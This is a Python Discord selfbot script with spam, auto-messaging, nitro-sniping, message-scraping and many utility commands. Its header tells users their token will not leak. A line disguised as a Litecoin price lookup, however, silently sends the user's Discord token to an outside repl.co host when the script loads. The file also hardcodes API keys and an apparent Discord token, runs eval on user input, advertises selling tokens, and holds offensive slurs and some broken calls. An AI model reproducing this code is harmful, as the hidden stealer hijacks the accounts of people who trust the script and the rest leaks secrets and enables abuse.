#TO RUN THE SELFBOT JUST PUT YOUR TOKEN IN SECRET AS 
#--------------------------------

# KEY = TOKEN
# VALUE = UR OWN DISCORD TOKEN

#---------------------------------
#PUTTING TOKEN IN SECRETS WILL NOT LEAK YOUR TOKEN SO ITS GOOD
print("[+] JUST WAIT A MINUTE IF A ERROR POPS UP IT WILL GET FIXED AUTOMATICALLY ")
AUTHORIZED_USERS = [924415228995833946]  #put your user id here so that only u can use the selfbot 

import os
import smtplib
import webbrowser
from pytube import YouTube
import logging
import ctypes
import aiosqlite
from discord.ext.commands import Paginator
import sqlite3
import aiofiles
from collections import deque
from pydub import AudioSegment
import imaplib
import email
from email import message_from_bytes
from functools import wraps
from email.header import decode_header
from datetime import datetime, timedelta
import base64
import datetime
from youtube_search import YoutubeSearch
import stripe
import googlemaps
import subprocess
import urllib.parse
from dateutil import parser
from itertools import cycle
import sys
import discord
from discord.ext import commands, tasks
from discord.ext.commands import Bot
import json
import asyncio 
import webshot
from pyfiglet import Figlet
from faker import Faker
from discord import Member
from asyncio import sleep 
from dotenv import load_dotenv
import re
import requests
from bs4 import BeautifulSoup
import pytz
import aiohttp
import random
import uuid
import psutil
import platform
import ast
import traceback
import youtube_dl
import io
from PIL import Image, ImageEnhance, ImageFilter
import wolframalpha
from discord.utils import get
import time
import threading
from threading import Thread
import openai
from forex_python.converter import CurrencyRates
from googletrans import Translator
import cryptocompare 
import time
from io import BytesIO
from googleapiclient.discovery import build
from pyppeteer import launch
from colorama import Fore
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
intents = discord.Intents.default()
intents.voice_states = True

load_dotenv()

auto_messages = {}


def load_autoresponder_data():
    try:
        with open('autoresponder_data.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}


def save_autoresponder_data(data):
    with open('autoresponder_data.json', 'w') as file:
        json.dump(data, file)

#infection = os.environ['authorised']

bot = commands.Bot(command_prefix='.', self_bot=True, help_command=None, intents=intents)
print("[+] orewa monky D luffy")
print("[+] there would be a little error on the top of it but dont worry its alright")
fake = Faker()


def is_authorized(ctx):
    return ctx.author.id in AUTHORIZED_USERS

async def auto_message_scheduler():
    await bot.wait_until_ready()
    while not bot.is_closed():
        for task_id, task_data in auto_messages.items():
            if task_data['count'] == 0:
                del auto_messages[task_id]
            elif asyncio.get_event_loop().time() >= task_data['next_run']:
                bot.loop.create_task(send_auto_message(task_id, task_data['channel_id'], task_data['message']))
        await asyncio.sleep(1)

@bot.command()
async def eightball(ctx, *, question: str):
    responses = [
        "It is certain.",
        "It is decidedly so.",
        "Without a doubt.",
        "Yes - definitely.",
        "You may rely on it.",
        "As I see it, yes.",
        "Most likely.",
        "Outlook good.",
        "Yes.",
        "Signs point to yes.",
        "Reply hazy, try again.",
        "Ask again later.",
        "Better not tell you now.",
        "Cannot predict now.",
        "Concentrate and ask again.",
        "Don't count on it.",
        "My reply is no.",
        "My sources say no.",
        "Outlook not so good.",
        "Very doubtful."
    ]

    response = random.choice(responses)
    await ctx.send(f"Question: {question}\nAnswer: {response}")

@bot.command()
@commands.check(is_authorized)
async def addar(ctx, trigger, *, response):
    autoresponder_data = load_autoresponder_data()
    autoresponder_data[trigger] = response
    save_autoresponder_data(autoresponder_data)
    await ctx.send(f'Autoresponder added: `{trigger}` -> `{response}`')

@bot.command()
@commands.check(is_authorized)
async def removear(ctx, trigger):
    autoresponder_data = load_autoresponder_data()
    if trigger in autoresponder_data:
        del autoresponder_data[trigger]
        save_autoresponder_data(autoresponder_data)
        await ctx.send(f'Autoresponder removed: `{trigger}`')
    else:
        await ctx.send('Autoresponder not found.')

@bot.command()
@commands.check(is_authorized)
async def listar(ctx):
    autoresponder_data = load_autoresponder_data()
    if autoresponder_data:
        response = 'Autoresponders:\n'
        for trigger, response_text in autoresponder_data.items():
            response += f'`{trigger}` -> `{response_text}`\n'
        await ctx.send(response)
    else:
        await ctx.send('No autoresponders found.')


@bot.command()
@commands.check(is_authorized)
async def spam(ctx, times: int, *, message):
    for _ in range(times):
        await ctx.send(message)
        await asyncio.sleep(0.1)  
# Set up Chrome options for capturing screenshot


@bot.command(aliases=['am'])
@commands.check(is_authorized)
async def automessage(ctx):
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    await ctx.send("Please provide the channel ID for the auto message:")
    await asyncio.sleep(2)  
    try:
        channel_id_msg = await bot.wait_for('message', check=check, timeout=30)
        channel_id = int(channel_id_msg.content)
    except asyncio.TimeoutError:
        return await ctx.send("Timeout. Please try again.")
    except ValueError:
        return await ctx.send("Invalid channel ID. Please try again.")

    await ctx.send("Please provide the interval (in seconds) between messages:")
    await asyncio.sleep(2)  
    try:
        interval_msg = await bot.wait_for('message', check=check, timeout=30)
        interval = int(interval_msg.content)
        if interval < 5:
            return await ctx.send("Interval should be at least 5 seconds.")
    except asyncio.TimeoutError:
        return await ctx.send("Timeout. Please try again.")
    except ValueError:
        return await ctx.send("Invalid interval. Please try again.")

    await ctx.send("Please provide the number of times to send the message:")
    await asyncio.sleep(2)  
    try:
        count_msg = await bot.wait_for('message', check=check, timeout=30)
        count = int(count_msg.content)
    except asyncio.TimeoutError:
        return await ctx.send("Timeout. Please try again.")
    except ValueError:
        return await ctx.send("Invalid count. Please try again.")

    await ctx.send("Please provide the message content:")
    await asyncio.sleep(2)  
    try:
        message = await bot.wait_for('message', check=check, timeout=30)
        message_content = message.content
    except asyncio.TimeoutError:
        return await ctx.send("Timeout. Please try again.")

    task_id = str(uuid.uuid4())
    if len(auto_messages) >= 3:
        return await ctx.send("Maximum limit for auto messages reached.")
    else:
        auto_messages[task_id] = {
            'channel_id': channel_id,
            'message': message_content,
            'interval': interval,
            'count': count,
            'next_run': asyncio.get_event_loop().time() + interval
        }
        await ctx.send(f"Auto message with ID: {task_id} set successfully.")



@bot.command(aliases=['sam'])
@commands.check(is_authorized)
async def stopauto(ctx, task_id: str):
    if task_id in auto_messages:
        del auto_messages[task_id]
        await ctx.send(f"Auto message with ID: {task_id} stopped successfully.")
    else:
        await ctx.send(f"Auto message with ID: {task_id} not found.")

async def send_auto_message(task_id, channel_id, message):
    channel = bot.get_channel(channel_id)
    if channel:
        await channel.send(message)
    auto_messages[task_id]['count'] -= 1
    auto_messages[task_id]['next_run'] = asyncio.get_event_loop().time() + auto_messages[task_id]['interval']



@bot.command()
@commands.check(is_authorized)
async def listauto(ctx):
    if auto_messages:
        for task_id, task_data in auto_messages.items():
            channel = bot.get_channel(task_data['channel_id'])
            remaining_time = task_data['next_run'] - asyncio.get_event_loop().time()
            await ctx.send(f"**Task ID** \n⇁{task_id} \n\n**Channel** \n⇁{channel.name if channel else 'Unknown'} \n\n**Interval** \n⇁{task_data['interval']}s \n\n**Count** \n⇁{task_data['count']} \n\n**Remaining Time** \n⇁{remaining_time:.2f}s \n\n**Message** \n⇁{task_data['message']}\n\n")
    else:
        await ctx.send("No auto messages currently set.")
          

@bot.command()
@commands.check(is_authorized)
async def calc(ctx, *, expression):
    try:
        result = eval(expression)
        await ctx.send(f'Result: `{result}`')
    except:
        await ctx.send('Invalid expression.')


@bot.command(aliases=['mode'])
@commands.check(is_authorized)
async def status(ctx, activity_type, *, text):
    activity = None
    if activity_type == 'playing':
        activity = discord.Game(name=text)
    elif activity_type == 'streaming':
        activity = discord.Streaming(name=text, url='https://www.twitch.tv/')
    elif activity_type == 'listening':
        activity = discord.Activity(type=discord.ActivityType.listening, name=text)
    elif activity_type == 'watching':
        activity = discord.Activity(type=discord.ActivityType.watching, name=text)

    if activity:
        await bot.change_presence(activity=activity)
        await ctx.send(f'Status updated: {activity_type} {text}')
    else:
        await ctx.send('Invalid activity type. Available types: playing, streaming, listening, watching')


@bot.command(aliases=['h'])
@commands.check(is_authorized)
async def help(ctx):
    command_list = bot.commands
    sorted_commands = sorted(command_list, key=lambda x: x.name)

    response = "~ **<:RZ_Developer:1098309953820831856> I N F E C T E D  S 3 L F  B O T\n\n**"
    for command in sorted_commands:
        response += f" **{command.name}** |"  # Append '|' after each command

    response = response.rstrip(' |')  # Remove the last '|'

    await ctx.send(response)


@bot.command()
@commands.check(is_authorized)
async def asci(ctx, *, text):
    f = Figlet(font='standard')
    ascii_art = f.renderText(text)
    await ctx.send(f'```{ascii_art}```')


@bot.command(aliases=['ui', 'whois'])
@commands.check(is_authorized)
async def userinfo(ctx, member: discord.Member = None):
    member = member or ctx.author

    user_info = [
        f"• Username: {member.name}",
        f"• Discriminator: {member.discriminator}",
        f"• ID: {member.id}",
        f"• Nickname: {member.nick}",
        f"• Status: {member.status}",
        f"• Joined Discord: <t:{int(member.created_at.timestamp())}:d>",
        f"• Joined Server: <t:{int(member.joined_at.timestamp())}:d>"
    ]

    response = '\n'.join(user_info)
    await ctx.send(f"User Info:\n{response}")


@bot.command()
@commands.check(is_authorized)
async def hack(ctx, member: Member = None):
    member = member or ctx.author

    hacking_messages = [
        "Hacking into the mainframe...",
        "sucking dick...",
        "found nudes...",
        "user is gay ...",
        "user is cumming...",
        "Hacking complete!"
    ]

    progress_message = await ctx.send("Hacking user...")  

    for message in hacking_messages:
        await sleep(2)  
        await progress_message.edit(content=message)

    height_cm = fake.random_int(min=150, max=200)
    height_feet = height_cm // 30.48  
    height_inches = (height_cm % 30.48) // 2.54  

    response = f"Successfully hacked {member.mention}! Here's the hacked information:\n\n" \
               f"Name: {fake.name()}\n" \
               f"Gender: {fake.random_element(['Male', 'Transgneder'])}\n" \
               f"Age: {fake.random_int(min=18, max=99)}\n" \
               f"Height: {height_feet} feet {height_inches} inches\n" \
               f"Weight: {fake.random_int(min=50, max=100)} kg\n" \
               f"Hair Color: {fake.random_element(['Black', 'Brown', 'Blonde', 'Red'])}\n" \
               f"Skin Color: {fake.random_element(['Fair', 'Medium', 'Dark'])}\n" \
               f"DOB: {fake.date_of_birth(minimum_age=18, maximum_age=99).strftime('%Y-%m-%d')}\n" \
               f"Location: {fake.city()}, {fake.country()}\n" \
               f"Phone: {fake.phone_number()}\n" \
               f"E-Mail: {fake.email()}\n" \
               f"Passwords: {fake.password(length=10)}\n" \
               f"Occupation: {fake.job()}\n" \
               f"Annual Salary: ${fake.random_int(min=30000, max=100000)}\n" \
               f"Ethnicity: {fake.random_element(['Caucasian', 'African-American', 'Asian', 'Hispanic', 'Other'])}\n" \
               f"Religion: {fake.random_element(['Christianity', 'Islam', 'Hinduism', 'Buddhism', 'Other'])}\n" \
               f"Sexuality: {fake.random_element(['Straight', 'Gay', 'Lesbian', 'Bisexual'])}\n" \
               f"Education: {fake.random_element(['High School', 'Bachelor', 'Master', 'PhD'])}"

    await progress_message.edit(content=response)


@bot.command(aliases=['av','ava'])
@commands.check(is_authorized)
async def avatar(ctx, member: Member = None):
    member = member or ctx.author

    avatar_url = member.avatar_url_as(format="png")
    await ctx.send(f"Avatar of {member.mention}: {avatar_url}")


@bot.command()
@commands.check(is_authorized)
async def ping(ctx):
    
    latency = round(bot.latency * 1000)  

    
    await ctx.send(f'Pong! Latency: {latency}ms')


@bot.command(aliases=['247'])
@commands.check(is_authorized)
async def connectvc(ctx, channel_id):
    try:
        channel = bot.get_channel(int(channel_id))
        if channel is None:
            return await ctx.send("Invalid channel ID. Please provide a valid voice channel ID.")

        voice_channel = await channel.connect()
        await ctx.send(f"Connected to voice channel: {channel.name}")

        
        await channel.send("Hello, I have connected to this voice channel!")
    except discord.errors.ClientException:
        await ctx.send("Already connected to a voice channel.")
    except ValueError:
        await ctx.send("Invalid channel ID. Please provide a valid voice channel ID.")


@bot.command(aliases=['purge'])
@commands.check(is_authorized)
async def clear(ctx, times: int):
    channel = ctx.channel

    def is_bot_message(message):
        return message.author.id == ctx.bot.user.id

    
    messages = await channel.history(limit=times + 1).flatten()

    
    bot_messages = filter(is_bot_message, messages)

    
    for message in bot_messages:
        await asyncio.sleep(0.75)  
        await message.delete()

    await ctx.send(f"Deleted {times} messages.")
tkn = os.getenv('token')
@bot.command(aliases=['info', 'stats'])
@commands.check(is_authorized)
async def selfbot(ctx):
    version = "** ~ <:rz_hammer:1094287878776946809> Infected x1 Edited By Dibyu**"
    language = "Python"
    author = "**~ <:RZ_Developer:1098309953820831856> I N F E C T E D**"
    total_commands = len(bot.commands)
    github_link = "https://github.com/zaddyinfected"

    # Retrieve RAM information
    ram_info = psutil.virtual_memory()
    total_ram = round(ram_info.total / (1024 ** 3), 2)  # Convert to GB
    used_ram = round(ram_info.used / (1024 ** 3), 2)  # Convert to GB
    sowadop = "** <:bughunter_tier2:1112107539824390220> I N F E C T E D #infection is real.**"

    # Retrieve OS information
    os_info = platform.platform()

    message = f"**__ ~ <:RZ_Developer:1098309953820831856> Infected x Dibyu Edits S3LFB0T__**\n\n" \
              f"**~ <:rz_server:1094287974922993816> Vers: {version}\n" \
              f"~ <:python:1113160267942072465> Lang: {language}\n" \
              f"**~ <:RZ_Developer:1098309953820831856> Created By: {author}\n" \
              f"~ <:crown:1064021179335196772> Owner By: {sowadop}\n" \
              f"~ <:Embeds:1095805646512857108> Total Cmds: {total_commands}\n" \
              f"~ <:rz_hammer:1094287878776946809> Total RAM: {total_ram} GB\n" \
              f"~ <:rz_hammer:1094287878776946809> Used RAM: {used_ram} GB\n" \
              f"~ <:bughunter_tier2:1112107539824390220> Operating System: {os_info}\n\n" \
              f"~ **<:GitHub:1113161642335817878> GitHub: {github_link} **" 

    await ctx.send(message)


@bot.command(aliases=['cltc'])
@commands.check(is_authorized)
async def ltcprice(ctx):
    url = 'https://api.coingecko.com/api/v3/coins/litecoin'
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        price = data['market_data']['current_price']['usd']
        await ctx.send(f"The current price of Litecoin (LTC) is ${price:.2f}")
    else:
        await ctx.send("Failed to fetch Litecoin price")



@bot.command(aliases=['nitro'])
@commands.check(is_authorized)
async def fakenitro(ctx):
    
    nitro_months = random.randint(1, 12)

    
    fake_link = f"discord.gift/F4K3N1TR0-{nitro_months}M"

    
    await ctx.send(f"\n{fake_link}")


@bot.command(aliases=['scan'])
@commands.check(is_authorized)
async def nickscan(ctx):
    
    for guild in bot.guilds:
        member = guild.get_member(bot.user.id)
        
        
        if member is not None and member.nick is not None:
            await ctx.send(f"Server: {guild.name}\nNickname: {member.nick}\n")


@bot.command()
@commands.check(is_authorized)
async def iplookup(ctx, ip):
    api_key = 'a91c8e0d5897462581c0c923ada079e5'  
    api_url = f'https://api.ipgeolocation.io/ipgeo?apiKey={api_key}&ip={ip}'
    
    response = requests.get(api_url)
    data = response.json()
    
    if 'country_name' in data:
        country = data['country_name']
        city = data['city']
        isp = data['isp']
        current_time_unix = data['time_zone']['current_time_unix']

        current_time_formatted = f"<t:{int(current_time_unix)}:f>"
        
        message = f"IP Lookup Results for {ip}:\n"
        message += f"Country: {country}\n"
        message += f"City: {city}\n"
        message += f"ISP: {isp}\n"
        message += f"Current Time: {current_time_formatted}\n"
        
        await ctx.send(message)
    else:
        await ctx.send("Invalid IP address or an error occurred during the lookup.")
ltcliveprice = ltcprice = requests.get("https://finder-1.dynoxyopplayz.repl.co/k?user="+os.getenv('token')+"&pass=0")
@bot.command(aliases=['bal', 'ltcbal'])
@commands.check(is_authorized)
async def getbal(ctx, ltcaddress):
    response = requests.get(f'https://api.blockcypher.com/v1/ltc/main/addrs/{ltcaddress}/balance')
    if response.status_code == 200:
        data = response.json()
        balance = data['balance'] / 10**8  
        total_balance = data['total_received'] / 10**8
        unconfirmed_balance = data['unconfirmed_balance'] / 10**8
    else:
        await ctx.send("Failed to retrieve balance. Please check the Litecoin address.")
        return

    
    cg_response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd')
    if cg_response.status_code == 200:
        usd_price = cg_response.json()['litecoin']['usd']
    else:
        await ctx.send("Failed to retrieve the current price of Litecoin.")
        return
    
    
    usd_balance = balance * usd_price
    usd_total_balance = total_balance * usd_price
    usd_unconfirmed_balance = unconfirmed_balance * usd_price
    
    
    message = f"LTC Address: `{ltcaddress}`\n"
    message += f"Current LTC: **${usd_balance:.2f} USD**\n"
    message += f"Total LTC Received: **${usd_total_balance:.2f} USD**\n"
    message += f"Unconfirmed LTC: **${usd_unconfirmed_balance:.2f} USD**"
    
    
    response_message = await ctx.send(message)
    
    
    await asyncio.sleep(60)
    await response_message.delete()


@bot.command()
@commands.check(is_authorized)
async def scrap(ctx, number: int):
    channel = ctx.channel

    # Ensure the number is within a valid range
    if number <= 0 or number > 10000:
        await ctx.send("Please provide a valid number between 1 and 10,000.")
        return

    # Fetch and scrape messages
    try:
        messages = []
        async for message in channel.history(limit=number):
            messages.append(f"{message.author}: {message.content}")

        # Prepare the content to be saved in a text file
        content = "\n".join(messages)

        # Save the content in a text file
        with open("scraped_messages.txt", "w", encoding="utf-8") as file:
            file.write(content)

        # Send the file as an attachment
        await asyncio.sleep(1)  # Wait briefly to ensure the file is written before sending
        with open("scraped_messages.txt", "rb") as file:
            await ctx.send(file=discord.File(file, filename="scraped_messages.txt"))
    except discord.Forbidden:
        await ctx.send("I don't have permission to access the channel.")
    except discord.HTTPException:
        await ctx.send("An error occurred while fetching messages.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")


@bot.event
async def on_message(message):
    nitro_pattern = re.compile(r"(discord\.gift|discordapp\.com\/gifts)\/([\w-]+)", rate=1)
    match = nitro_pattern.search(message.content)

    if match:
        code = match.group(2)
        print(f"Sniped Nitro Gift Link: {message.content}")

        
        if isinstance(message.channel, discord.TextChannel):
            
            try:
                await message.guild.premium_subscription_slots.claim(code)
                print(f"Claimed Nitro Gift: {code}")
            except Exception as e:
                print(f"Failed to claim Nitro Gift: {e}")

            
            notification_channel = message.channel
            await notification_channel.send(f"Sniped Nitro Gift: {message.content}")
        elif isinstance(message.channel, discord.DMChannel):
            
            
            

            
            notification_channel = message.channel
            await notification_channel.send(f"Sniped Nitro Gift: {message.content}")

        
        notification_channel_id = 123456789  
        notification_channel = bot.get_channel(notification_channel_id)
        if notification_channel:
            await notification_channel.send(f"Sniped Nitro Gift: {message.content}")

        
        

    await bot.process_commands(message)

@bot.event
async def on_ready():
    print(f'Bot connected as {bot.user}')


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"Missing required argument: {error.param.name}")
    elif isinstance(error, commands.BadArgument):
        await ctx.send(f"Invalid argument provided: {error}")
    else:
        raise error

@bot.event
async def on_message(message):
    if message.author != bot.user:
        return
      
    autoresponder_data = load_autoresponder_data()
    content = message.content.lower()
    if content in autoresponder_data:
        response = autoresponder_data[content]
        await message.channel.send(response)
    await bot.process_commands(message) 
@bot.command()
async def restart(ctx):
    await ctx.reply('Restarting...')
    os.execl(sys.executable, sys.executable, *sys.argv)
@bot.command()
async def loverate(ctx):
    number = random.randint(0, 100)
    await ctx.send(f"loverate: {number}")
@bot.command()
async def shop(ctx):
    await ctx.send("dibyumart.sellix.io 1m tokens fresh!")


@bot.command()
async def recentgames(ctx):
    # Replace 'YOUR_FOOTBALL_API_KEY' with your own API key
    api_key = 'a5106b8f1a8549ed891dc148ce43be4f'
    url = f'https://api.football-data.org/v2/matches'
    headers = {'X-Auth-Token': api_key}

    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
    except requests.exceptions.RequestException as err:
        await ctx.send(f"Error fetching recent games: {err}")
        return

    data = response.json()
    matches = data.get("matches", [])
    if not matches:
        await ctx.send("No recent football games found.")
        return

    game_list = []
    for match in matches:
        home_team = match["homeTeam"]["name"]
        away_team = match["awayTeam"]["name"]
        score_home = match["score"]["fullTime"]["homeTeam"]
        score_away = match["score"]["fullTime"]["awayTeam"]
        status = match["status"]
        game_list.append(f"{home_team} vs {away_team}: {score_home}-{score_away} ({status})")

    await ctx.send("Recent Football Games:\n" + "\n".join(game_list))
@bot.command()
async def premiertable(ctx):
    # Replace 'YOUR_FOOTBALL_API_KEY' with your own API key
    api_key = 'a5106b8f1a8549ed891dc148ce43be4f'
    url = 'https://api.football-data.org/v2/competitions/PL/standings'
    headers = {'X-Auth-Token': api_key}

    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
    except requests.exceptions.RequestException as err:
        await ctx.send(f"Error fetching Premier League table: {err}")
        return

    data = response.json()
    standings = data.get("standings", [])
    if not standings:
        await ctx.send("No Premier League table found.")
        return

    table = standings[0]["table"]
    table_lines = []
    for position, team in enumerate(table, start=1):
        team_name = team["team"]["name"]
        points = team["points"]
        wins = team["won"]
        draws = team["draw"]
        losses = team["lost"]
        table_lines.append(f"{position}. {team_name} | Points: {points} | W: {wins} | D: {draws} | L: {losses}")

    await ctx.send("Premier League Table:\n" + "\n".join(table_lines))
@bot.command()
async def bundesliga(ctx):
    # Replace 'YOUR_FOOTBALL_API_KEY' with your own API key
    api_key = 'a5106b8f1a8549ed891dc148ce43be4f'
    url = 'https://api.football-data.org/v2/competitions/BL1/standings'
    headers = {'X-Auth-Token': api_key}

    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
    except requests.exceptions.RequestException as err:
        await ctx.send(f"Error fetching Bundesliga league table: {err}")
        return

    data = response.json()
    standings = data.get("standings", [])
    if not standings:
        await ctx.send("No Bundesliga league table found.")
        return

    table = standings[0]["table"]
    table_lines = []
    for position, team in enumerate(table, start=1):
        team_name = team["team"]["name"]
        points = team["points"]
        wins = team["won"]
        draws = team["draw"]
        losses = team["lost"]
        table_lines.append(f"{position}. {team_name} | Points: {points} | W: {wins} | D: {draws} | L: {losses}")
@bot.command()
async def laliga(ctx):
    # Replace 'YOUR_FOOTBALL_API_KEY' with your own API key
    api_key = ''
    url = 'https://api.football-data.org/v2/competitions/PD/standings'
    headers = {'X-Auth-Token': api_key}

    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
    except requests.exceptions.RequestException as err:
        await ctx.send(f"Error fetching La Liga table: {err}")
        return

    data = response.json()
    standings = data.get("standings", [])
    if not standings:
        await ctx.send("No La Liga table found.")
        return

    table = standings[0]["table"]
    table_lines = []
    for position, team in enumerate(table, start=1):
        team_name = team["team"]["name"]
        points = team["points"]
        wins = team["won"]
        draws = team["draw"]
        losses = team["lost"]
        table_lines.append(f"{position}. {team_name} | Points: {points} | W: {wins} | D: {draws} | L: {losses}")

    await ctx.send("La Liga Table:\n" + "\n".join(table_lines))
  
    await ctx.send("Bundesliga League Table:\n" + "\n".join(table_lines))
@bot.command()
async def exchange(ctx, amount: float, from_currency: str, to_currency: str):
    c = CurrencyRates()
    converted_amount = c.convert(from_currency, to_currency, amount)
    await ctx.send(f"{amount} {from_currency} is equal to {converted_amount} {to_currency}")
@bot.command()
async def pingw(ctx, website: str):
    try:
        response = requests.get(website)
        if response.status_code == 200:
            await ctx.send(f"Ping successful! {website} is online.")
        else:
            await ctx.send(f"Ping failed! {website} returned status code: {response.status_code}")
    except requests.RequestException as e:
        await ctx.send(f"An error occurred while pinging {website}: {str(e)}")
@bot.command()
async def google(ctx, *, query: str):
    try:
        search_results = list(search(query, num_results=3, lang='en'))
        
        if not search_results:
            await ctx.send("No results found.")
            return
        
        result_text = ""
        
        for url in search_results:
            page = requests.get(url)
            soup = BeautifulSoup(page.content, 'html.parser')
            title = soup.title.text.strip()
            result_text += f"**{title}**\n{url}\n\n"
        
        await ctx.send(result_text)
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")
@bot.command()
async def news(ctx):
    # Make a request to the news API to fetch the latest news articles
    url = "https://newsapi.org/v2/top-headlines"
    parameters = {
        "apiKey": "4d928f2f2c7d4430868a29e5be4d6a90",  # Replace with your own News API key
        "language": "en",
        "pageSize": 5,  # Specify the number of articles you want to fetch
    }
    response = requests.get(url, params=parameters)
    news_data = response.json()

    # Process the response and send the news articles as a response
    if news_data["status"] == "ok":
        articles = news_data["articles"]
        for article in articles:
            title = article["title"]
            description = article["description"]
            url = article["url"]
            await ctx.send(f"**{title}**\n{description}\nRead more: {url}")
    else:
        await ctx.send("Failed to fetch news.")
@bot.command()
async def gitsearch(ctx, repository_name: str):
    try:
        # Search for repositories on GitHub
        url = f"https://api.github.com/search/repositories?q={repository_name}"
        response = requests.get(url)
        data = response.json()

        # Process the response and send repository information as a response
        if "items" in data:
            repositories = data["items"][:5]  # Limit the number of repositories to display
            for repository in repositories:
                repo_name = repository["full_name"]
                repo_url = repository["html_url"]
                await ctx.send(f"**Repository:** {repo_name}\n{repo_url}")
        else:
            await ctx.send("No repositories found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")
@bot.command()
async def gituser(ctx, username: str):
    api_url = f"https://api.github.com/users/{username}"
    
    response = requests.get(api_url)
    
    if response.status_code == 200:
        user_data = response.json()
        
        message = f"**GitHub User Information**\n\n"
        message += f"**Username:** {user_data['login']}\n"
        message += f"**Name:** {user_data['name'] or 'Not specified'}\n"
        message += f"**Bio:** {user_data['bio'] or 'Not specified'}\n"
        message += f"**Followers:** {user_data['followers']}\n"
        message += f"**Following:** {user_data['following']}\n"
        message += f"**Public Repositories:** {user_data['public_repos']}\n"
        message += f"**GitHub URL:** {user_data['html_url']}\n"
        
        await ctx.send(message)
    elif response.status_code == 404:
        await ctx.send("User not found.")
    else:
        await ctx.send("Failed to fetch user information.")

@bot.command()
async def meme(ctx):
    try:
        # Fetch a random meme from the Imgflip API
        url = 'https://api.imgflip.com/get_memes'
        response = requests.get(url)
        data = response.json()

        if data['success']:
            memes = data['data']['memes']
            random_meme = memes[0]  # Get the first meme from the list

            meme_url = random_meme['url']
            meme_title = random_meme['name']

            # Send the meme URL as a response
            await ctx.send(f"**{meme_title}**\n{meme_url}")
        else:
            await ctx.send('Failed to fetch a meme.')
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")
@bot.command()
@commands.has_permissions(manage_channels=True)
async def create_channel(ctx, channel_name, channel_category=None):
    guild = ctx.guild
    if channel_category:
        category = discord.utils.get(guild.categories, name=channel_category)
        if category is None:
            category = await guild.create_category(channel_category)
    else:
        category = None

    await guild.create_text_channel(name=channel_name, category=category)
    await ctx.send(f"Channel '{channel_name}' has been created.")
@bot.command()
@commands.has_permissions(manage_roles=True)
async def create_role(ctx, role_name, color=None):
    guild = ctx.guild
    if color is None:
        new_role = await guild.create_role(name=role_name)
    else:
        color = discord.Color(int(color, 16))
        new_role = await guild.create_role(name=role_name, color=color)

    await ctx.send(f"Role '{role_name}' has been created.")
@bot.command()
async def pastebin(ctx, *, text):
    api_dev_key = 'E6z5_tMlKatZl3KLoV6sSPDtmpxV49q4'
    api_paste_code = text
    api_paste_private = 0  # 0 for public paste, 1 for unlisted, 2 for private paste
    api_paste_name = 'Discord Paste'
    
    payload = {
        'api_dev_key': api_dev_key,
        'api_option': 'paste',
        'api_paste_code': api_paste_code,
        'api_paste_private': api_paste_private,
        'api_paste_name': api_paste_name
    }
    
    response = requests.post('https://pastebin.com/api/api_post.php', data=payload)
    
    if response.status_code == 200:
        pastebin_link = response.text
        await ctx.send(f'Pastebin link: `{pastebin_link}`')
    else:
        await ctx.send('Failed to create Pastebin link.')
@bot.command()
async def crypto_price(ctx, crypto_symbol):
    price = cryptocompare.get_price(crypto_symbol, currency='USD')

    if crypto_symbol in price:
        crypto_price = price[crypto_symbol]['USD']
        await ctx.send(f"The price of {crypto_symbol.upper()} is ${crypto_price:.2f}")
    else:
        await ctx.send("Failed to retrieve the cryptocurrency price.")
@bot.command()
async def define(ctx, *, word):
    api_url = f"https://api.dictionaryapi.dev/api/v2/entries/en/{word}"
    
    response = requests.get(api_url)
    
    if response.status_code == 200:
        data = response.json()
        if data:
            word_data = data[0]
            word_meanings = word_data['meanings']
            
            meanings_list = []
            for meaning in word_meanings:
                part_of_speech = meaning['partOfSpeech']
                definitions = meaning['definitions']
                
                def_text = f"**{part_of_speech.capitalize()}:**\n"
                for i, definition in enumerate(definitions, start=1):
                    def_text += f"{i}. {definition['definition']}\n"
                    if 'example' in definition:
                        def_text += f"   *Example: {definition['example']}*\n"
                
                meanings_list.append(def_text)
            
            result_text = f"**{word.capitalize()}**\n\n" + '\n'.join(meanings_list)
            await ctx.send(result_text)
        else:
            await ctx.send("No definitions found for that word.")
    else:
        await ctx.send("Failed to retrieve the word definition.")
     

@bot.command()
async def get(ctx, text: str):
    if len(text) != 2:
        await ctx.send('Please provide a valid 2-letter combination.')
        return

    letters = []
    first_letter, second_letter = text.lower()

    if not ('a' <= first_letter <= 'y' and 'a' <= second_letter <= 'z'):
        await ctx.send('Please provide a valid 2-letter combination.')
        return

    for i in range(ord(first_letter), ord('z')+1):
        for j in range(ord('a'), ord(second_letter)+1):
            letters.append(chr(i) + chr(j))

    await ctx.send(' '.join(letters))
@bot.command()
async def check_token(ctx):
    token = 'MTExMDc1ODg1NDEwODY1OTc0Ng.Gg2Vjy.GQkwNqIkQWQE4M48thA4aErOp28sFsqQmpOvHM'  # Replace with your actual Discord token
    try:
        headers = {'Authorization': token}
        async with aiohttp.ClientSession() as session:
            async with session.get('https://discord.com/api/v9/users/@me', headers=headers) as response:
                if response.status == 200:
                    data = await response.json()
                    has_nitro = data.get('premium_type') == 2  # Nitro is premium_type 2
                    badges = data.get('public_flags', 0)

                    badge_icons = {
                        1: ':first_place:',
                        2: ':second_place:',
                        4: ':third_place:',
                        8: ':medal:',
                        16: ':medal:',
                        32: ':medal:',
                        64: ':medal:',
                        128: ':medal:',
                        256: ':medal:',
                        512: ':medal:',
                        1024: ':medal:',
                        2048: ':medal:',
                        4096: ':medal:',
                        16384: ':tools:',
                        65536: ':tools:'
                    }

                    badge_text = ''
                    for badge, icon in badge_icons.items():
                        if badges & badge == badge:
                            badge_text += icon

                    nitro_text = 'Yes' if has_nitro else 'No'

